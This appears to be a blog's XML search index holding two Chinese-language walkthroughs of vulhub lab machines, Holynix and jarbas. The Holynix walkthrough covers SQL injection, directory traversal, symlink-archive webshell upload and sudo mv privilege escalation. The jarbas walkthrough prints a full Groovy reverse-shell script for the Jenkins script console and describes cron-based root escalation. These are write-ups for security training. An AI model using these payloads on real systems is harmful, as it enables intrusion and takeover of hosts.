<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>vulhub Holynix</title>
    <link href="/2024/03/28/Holynix/"/>
    <url>/2024/03/28/Holynix/</url>
    
    <content type="html"><![CDATA[<p>vulhub Holynix walkthrough</p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132109.png" alt="image.png"></p><blockquote><p>该靶机提供的为tar.bz2文件，先用PS解压</p></blockquote><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><blockquote><p>主机发现：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132133.png" alt="image.png"></p><blockquote><p>全端口扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132140.png" alt="image.png"></p><blockquote><p>tcp只开了80，保险起见进行udp扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132149.png" alt="image.png"></p><blockquote><p>目前来看确实只有80开放，进行详细信息扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132158.png" alt="image.png"></p><blockquote><p>ubuntu跑着apache，开始web渗透：</p></blockquote><h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><blockquote><p>跑起目录爆破，同时打开浏览器访问web服务：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132221.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132228.png" alt="image.png"></p><blockquote><p>一个登录界面</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132239.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132300.png" alt="image.png"></p><blockquote><p>一句话绕过登录，以alamo身份进到系统</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132308.png" alt="image.png"></p><blockquote><p>雇员名单</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132318.png" alt="image.png"></p><blockquote><p>从留言板得知信息：</p><ol><li>可能目标机安装了gcc</li><li>可能有一个每五分钟一次的计划任务</li><li>ssh服务被部署了端口敲击隐藏起来</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132327.png" alt="image.png"></p><blockquote><p>可以上传文件，且可以自动解压gzip文件</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132347.png" alt="image.png"></p><blockquote><p>只多扫出来两个存放杂文件的目录<br>从文件上传入手：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132353.png" alt="image.png"></p><blockquote><p>报错alamo不允许传文件<br>那就先看Security项目：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132400.png" alt="image.png"></p><blockquote><p>该功能通过此选项控制下方内容，抓包测试，无注入，但text_file_name参数处存在目录穿越：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132409.png" alt="image.png"></p><blockquote><p>读到&#x2F;etc&#x2F;passwd发现除了alamo还有不少其他用户，可能有人有文件上传权限，又想起来登录页面有注入点，尝试注入：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132428.png" alt="image.png"></p><blockquote><p>可以打通，且有creds库，查看：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132439.png" alt="image.png"></p><blockquote><p>看到sqlmap使用的盲注，跑字段果然dump不出来东西，如果还要查就需要写盲注脚本了<br>不过先不急，还有另一个线索可以尝试：<br>目录穿越可以成功，大概率使用的数据流操作函数，尝试使用伪协议读文件：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132448.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$auth</span> == <span class="hljs-number">0</span> ) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h2&gt;Content Restricted&lt;/h2&gt;&lt;/center&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3&gt;Home Directory Uploader&lt;/h3&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;form enctype=&#x27;multipart/form-data&#x27; action=&#x27;index.php?page=transfer.php&#x27; method=&#x27;POST&#x27;&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Please choose a file: &lt;input name=&#x27;uploaded&#x27; type=&#x27;file&#x27; /&gt;&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;input type=&#x27;checkbox&#x27; name=&#x27;autoextract&#x27; value=&#x27;true&#x27; /&gt; Enable the automatic extraction of gzip archives.&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;input type=&#x27;submit&#x27; value=&#x27;Upload&#x27; /&gt;&lt;/form&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>果然可以，这里可以看到upload页面使用auth校验身份，但此文件中又未定义，那么大胆猜测是通过cookie验证的，抓包：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132456.png" alt="image.png"></p><blockquote><p>很幸运的是直接用uid&#x3D;1确定身份，尝试修改：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132518.png" alt="image.png"></p><blockquote><p>成功上传，且看到名字变成了etenenbaum</p></blockquote><blockquote><p>为了找上传路径，查看上传文件的transfer.php：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$auth</span> == <span class="hljs-number">0</span> ) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h2&gt;Content Restricted&lt;/h2&gt;&lt;/center&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$upload</span> == <span class="hljs-number">1</span> )<br>&#123;<br><span class="hljs-variable">$homedir</span> = <span class="hljs-string">&quot;/home/&quot;</span>.<span class="hljs-variable">$logged_in_user</span>. <span class="hljs-string">&quot;/&quot;</span>;<br><span class="hljs-variable">$uploaddir</span> = <span class="hljs-string">&quot;upload/&quot;</span>;<br><span class="hljs-variable">$target</span> = <span class="hljs-variable">$uploaddir</span> . <span class="hljs-title function_ invoke__">basename</span>( <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]) ;<br><span class="hljs-variable">$uploaded_type</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br><span class="hljs-variable">$command</span>=<span class="hljs-number">0</span>;<br><span class="hljs-variable">$ok</span>=<span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$uploaded_type</span> ==<span class="hljs-string">&quot;application/gzip&quot;</span> &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;autoextract&#x27;</span>] == <span class="hljs-string">&#x27;true&#x27;</span> ) &#123;<span class="hljs-variable">$command</span> = <span class="hljs-number">1</span>; &#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$ok</span>==<span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry your file was not uploaded&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&#x27;?index.php?page=upload.php&#x27; &gt;Back to upload page&lt;/a&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$target</span>))<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3&gt;The file &#x27;&quot;</span> .<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]. <span class="hljs-string">&quot;&#x27; has been uploaded.&lt;/h3&gt;&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;The ownership of the uploaded file(s) have been changed accordingly.&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&lt;a href=&#x27;?page=upload.php&#x27; &gt;Back to upload page&lt;/a&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$command</span> == <span class="hljs-number">1</span> )<br>&#123;<br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;sudo tar xzf &quot;</span> .<span class="hljs-variable">$target</span>. <span class="hljs-string">&quot; -C &quot;</span> .<span class="hljs-variable">$homedir</span>);<br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;rm &quot;</span> .<span class="hljs-variable">$target</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;sudo mv &quot;</span> .<span class="hljs-variable">$target</span>. <span class="hljs-string">&quot; &quot;</span> .<span class="hljs-variable">$homedir</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>&#125;<br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/var/apache2/htdocs/update_own&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, there was a problem uploading your file.&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&lt;a href=&#x27;?page=upload.php&#x27; &gt;Back to upload page&lt;/a&gt;&quot;</span>;<br>&#125;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&lt;br /&gt;&lt;h3&gt;Home directory uploading disabled for user &quot;</span> .<span class="hljs-variable">$logged_in_user</span>. <span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>; &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><blockquote><ol><li>不使用解压缩功能：上传到upload&#x2F;，之后移动到对应的家目录</li><li>使用解压缩功能：上传到upload&#x2F;，解压缩到对应的家目录</li><li>还执行了一个脚本 <code>exec(&quot;/var/apache2/htdocs/update_own&quot;)</code></li></ol></blockquote><blockquote><p>&#x2F;var&#x2F;apache2&#x2F;htdocs&#x2F;update_own：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>sudo <span class="hljs-built_in">chown</span> root:root /home/<br>sudo <span class="hljs-built_in">chown</span> -R alamo:developers /home/alamo/<br>sudo <span class="hljs-built_in">chown</span> -R nobody:developers /home/development/<br>sudo <span class="hljs-built_in">chown</span> -R etenenbaum:<span class="hljs-built_in">users</span> /home/etenenbaum/<br>sudo <span class="hljs-built_in">chown</span> -R gmckinnon:<span class="hljs-built_in">users</span> /home/gmckinnon/<br>sudo <span class="hljs-built_in">chown</span> -R hreiser:staff /home/hreiser/<br>sudo <span class="hljs-built_in">chown</span> -R jdraper:<span class="hljs-built_in">users</span> /home/jdraper/<br>sudo <span class="hljs-built_in">chown</span> -R jjames:staff /home/jjames/<br>sudo <span class="hljs-built_in">chown</span> -R jljohansen:developers /home/jljohansen/<br>sudo <span class="hljs-built_in">chown</span> -R kpoulsen:<span class="hljs-built_in">users</span> /home/kpoulsen/<br>sudo <span class="hljs-built_in">chown</span> -R ltorvalds:admin /home/ltorvalds/<br>sudo <span class="hljs-built_in">chown</span> -R mrbutler:staff /home/mrbutler/<br>sudo <span class="hljs-built_in">chown</span> -R rtmorris:<span class="hljs-built_in">users</span> /home/rtmorris/<br></code></pre></td></tr></table></figure><blockquote><p>暴露出了所有用户名，暂时没什么用<br>前往家目录找上传的马：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132530.png" alt="image.png"></p><h3 id="apache每用户目录"><a href="#apache每用户目录" class="headerlink" title="apache每用户目录"></a>apache每用户目录</h3><blockquote><p>从源码可以看到最终的保存路径是&#x2F;home&#x2F;user，但只能通过~user的方式从web访问到：</p></blockquote><blockquote><p>Apache Web 服务器通常允许用户创建个人网页或站点，这些网页可以存放在每个用户的个人目录中。</p></blockquote><blockquote><p>http:&#x2F;&#x2F;&lt;ip&gt;&#x2F;<del>user1 和 http:&#x2F;&#x2F;&lt;ip&gt;&#x2F;home&#x2F;user1 并不等价。在Apache Web服务器中，&#x2F;home&#x2F;user1 是用户的个人目录的实际位置，而 ~user1 是通过mod_userdir模块配置的用户主页的访问路径。http:&#x2F;&#x2F;&lt;ip&gt;&#x2F;</del>user1 是一种特定的语法，在Web服务器中会被解析为用户 user1 的个人目录。而 http:&#x2F;&#x2F;&lt;ip&gt;&#x2F;home&#x2F;user1 则是直接指向 &#x2F;home&#x2F;user1 目录的路径，没有经过 Apache 的 mod_userdir 模块的解析。因此，这个路径可能无法正常访问到用户的个人网页。</p></blockquote><blockquote><p>回到题目：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132538.png" alt="image.png"></p><blockquote><p>居然没有读权限！猜测对整个家目录的上传的文件不具有读权限，想起来上传点还有解压功能，而且tar的解压命令是支持动态软链接的，值得尝试通过软链接将上传路径改到web根目录：</p></blockquote><h3 id="软链接写马"><a href="#软链接写马" class="headerlink" title="软链接写马"></a>软链接写马</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132611.png" alt="image.png"></p><blockquote><p>test1用来改变目录，删掉现有test文件，创建test目录用来写马：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132621.png" alt="image.png"></p><blockquote><p>依次上传test1、test2，最终在web路径下访问shell.php：</p></blockquote><blockquote><p>注意：上传完test1后其实并不会在旧上传目录下看到test，将test理解为管道较为合适<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132629.png" alt="image.png"></p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132639.png" alt="image.png"></p><blockquote><p>成功rce，反弹shell：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132649.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132656.png" alt="image.png"></p><blockquote><p>使用mkfifo反弹成功</p></blockquote><h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132717.png" alt="image.png"></p><blockquote><p>这里也可以看到test确实指向了网站根目录</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132731.png" alt="image.png"></p><blockquote><p>sudo枚举发现不需要密码就可以执行mv</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132738.png" alt="image.png"></p><h3 id="mv提权"><a href="#mv提权" class="headerlink" title="mv提权"></a>mv提权</h3><blockquote><p>由于<code>sudo mv</code>不需要密码，故将&#x2F;bin&#x2F;su移为&#x2F;bin&#x2F;mv，执行<code>sudo mv</code>即无密码执行<code>sudo su</code></p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132757.png" alt="image.png"></p><h2 id="0x04-总结反思补足"><a href="#0x04-总结反思补足" class="headerlink" title="0x04 总结反思补足"></a>0x04 总结反思补足</h2><h3 id="文件上传软链接"><a href="#文件上传软链接" class="headerlink" title="文件上传软链接"></a>文件上传软链接</h3><blockquote><p>利用1. 任意文件读取<br>条件：知道绝对路径、(www-data) 有读权限</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132805.png" alt="image.png"></p><blockquote><p><code>zip --symlinks</code>和<code>tar czf</code>均可打包动态的软链接，上传被解压后访问可以像钩子把目标文件勾出来</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /flag getflag<br>tar czf getflag.tar.gz getflag<br>zip --symlinks getflag.zip getflag<br></code></pre></td></tr></table></figure><blockquote><p>利用2. 改变文件上传路径<br>条件：知道网站根目录绝对路径</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132814.png" alt="image.png"></p><blockquote><p>test1用来改变目录，删掉现有test文件，创建test目录用来写马：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132827.png" alt="image.png"></p><blockquote><p>依次上传test1、test2，最终在web路径下访问shell.php：</p></blockquote><blockquote><p>注意：上传完test1后其实并不会在旧上传目录下看到test，将test理解为管道较为合适<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132849.png" alt="image.png"></p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132855.png" alt="image.png"></p><blockquote><p>在web路径下访问到了shell.php</p></blockquote><h3 id="sqlmap少用batch"><a href="#sqlmap少用batch" class="headerlink" title="sqlmap少用batch"></a>sqlmap少用batch</h3><blockquote><p>再次使用sqlmap跑了遍注入，去掉了batch参数，跑出来了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132908.png" alt="image.png"></p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><ol><li>端口扫描：只扫到了web服务，且存在sql注入</li><li>web渗透：sql一句话进入系统后台，存在当前用户无法使用的文件上传功能，修改cookie成功越权；在找不到上传路径的情况下发现文件包含点，利用伪协议读出各文件，得知上传路径为家目录，但无权访问家目录下的shell；猜测原因为目录权限问题，结合提供了解压缩功能，上传软链接修改上传路径为web根目录，在新上传路径下访问到shell，蚁剑连接，尝试多种反弹shell语句，最终mkfifo反弹成功</li><li>提权：mv命令具有无需密码的sudo权限，将mv的执行文件替换为su的执行文件，执行sudo mv达到sudo su的提权效果</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub jarbas</title>
    <link href="/2024/03/27/jarbas/"/>
    <url>/2024/03/27/jarbas/</url>
    
    <content type="html"><![CDATA[<p>vulhub jarbas walkthrough</p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><blockquote><p>主机发现：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194449.png" alt="image.png"></p><blockquote><p>全端口扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194458.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194516.png" alt="image.png"></p><blockquote><p>udp并无有效信息<br>详细信息扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194550.png" alt="image.png"></p><blockquote><p>扫到8080是jetty 9.4.z-snapshot：用于java web的servlet容器(类似tomcat)</p></blockquote><blockquote><p>脚本扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194614.png" alt="image.png"></p><blockquote><p>扫到8080的robots.txt，大致确定本机主要考察web渗透</p></blockquote><h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194624.png" alt="image.png"></p><blockquote><p>80应该是个买东西的网页？有注册、查找功能，查找功能无效</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194630.png" alt="image.png"></p><blockquote><p>8080好像是jenkins的后台登录，jenkins好像是一个集成的开发平台，不是cms</p></blockquote><blockquote><p>我选择从80入手，目录爆破：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194639.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194647.png" alt="image.png"></p><blockquote><p>给了三个creds，还说加密很安全</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194657.png" alt="image.png"></p><blockquote><p>全是md5，解密：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194705.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194937.png" alt="image.png"></p><blockquote><p>拿凭据第一件事先尝试ssh：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194946.png" alt="image.png"></p><blockquote><p>失败<br>回到主站，发现页面显示逻辑好像是通过f参数确定：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194958.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195009.png" alt="image.png"></p><blockquote><p>没测出idor和注入，但是在该页面发现登录和文件上传功能，且上传功能要先登录<br>尝试用刚获取的凭据登录：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195028.png" alt="image.png"></p><blockquote><p>登录功能需要的是邮箱，只能转去尝试注册了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195037.png" alt="image.png"></p><blockquote><p>查看源码发现注册功能根本不能用</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195045.png" alt="image.png"></p><blockquote><p>登录功能确实可用，思路断了<br>只能转去看8080了，目录爆破的同时尝试用刚刚的凭据登录：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195101.png" alt="image.png"></p><blockquote><p>只有eder的凭据登录成功，目录爆破毫无结果，直接开始后台的渗透：</p></blockquote><h3 id="Jenkins后台渗透"><a href="#Jenkins后台渗透" class="headerlink" title="Jenkins后台渗透"></a>Jenkins后台渗透</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195131.png" alt="image.png"></p><blockquote><p>在“脚本命令行”功能中发现可以运行命令，提示说使用Groovy语法，google出简单语法，发现可以执行：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195143.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195203.png" alt="image.png"></p><blockquote><p>这里尝试了常规的rce使用的bash反弹，失败，甚至无法执行bash等shell命令，存疑！</p></blockquote><blockquote><p>常规rce反弹失败，直接从(<a href="https://forum.ywhack.com/shell.php)%E7%94%9F%E6%88%90Groovy%E8%AF%AD%E6%B3%95%E7%9A%84%E5%8F%8D%E5%BC%B9shell%EF%BC%9A">https://forum.ywhack.com/shell.php)生成Groovy语法的反弹shell：</a></p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195212.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195223.png" alt="image.png"></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs Groovy">String host=<span class="hljs-string">&quot;10.10.10.128&quot;</span>;<br><span class="hljs-type">int</span> port=<span class="hljs-number">9999</span>;<br>String cmd=<span class="hljs-string">&quot;/bin/bash&quot;</span>;<br>Process p=<span class="hljs-keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(<span class="hljs-literal">true</span>).start();<br>Socket s=<span class="hljs-keyword">new</span> Socket(host,port);<br>InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();<br>OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="hljs-keyword">while</span>(!s.isClosed())<br>&#123;<span class="hljs-keyword">while</span>(pi.available()&gt;<span class="hljs-number">0</span>)so.write(pi.read());<span class="hljs-keyword">while</span>(pe.available()&gt;<span class="hljs-number">0</span>)so.write(pe.read());<br>    <span class="hljs-keyword">while</span>(si.available()&gt;<span class="hljs-number">0</span>)po.write(si.read());so.flush();po.flush();Thread.sleep(<span class="hljs-number">50</span>);<span class="hljs-keyword">try</span><br>&#123;p.exitValue();<span class="hljs-keyword">break</span>;&#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;&#125;;p.destroy();s.close();<br><br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195240.png" alt="image.png"></p><blockquote><p>拿到立足点jenkins用户的shell</p></blockquote><h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><blockquote><p>初步信息探查：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195250.png" alt="image.png"></p><blockquote><p>自动任务枚举：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195258.png" alt="image.png"></p><blockquote><p>有root运行的自动任务，且文件有777权限<br>不知道为什么起不了交互shell，只能用重定向的方法把反弹shell语句写入自动任务脚本了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195309.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195317.png" alt="image.png"></p><blockquote><p>拿到root flag</p></blockquote><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ol><li>端口扫描：80 web服务、8080 Jenkins后台、22 ssh、3306 mysql</li><li>web渗透：从80隐藏页面拿到Jenkins登录凭据，使用Jenkins的脚本命令行实现getshell（其余多种攻击手法见下文）</li><li>提权：存在root身份的777权限的自动任务，修改后弹出root shell</li></ol><h2 id="0x05-Jenkins攻击向量总结"><a href="#0x05-Jenkins攻击向量总结" class="headerlink" title="0x05 Jenkins攻击向量总结"></a>0x05 Jenkins攻击向量总结</h2><h3 id="尝试拿配置文件"><a href="#尝试拿配置文件" class="headerlink" title="尝试拿配置文件"></a>尝试拿配置文件</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195336.png" alt="image.png"></p><h3 id="脚本命令行"><a href="#脚本命令行" class="headerlink" title="脚本命令行"></a>脚本命令行</h3><blockquote><ol><li>简单命令执行(注意该语句不可执行反弹shell)：</li></ol></blockquote><figure 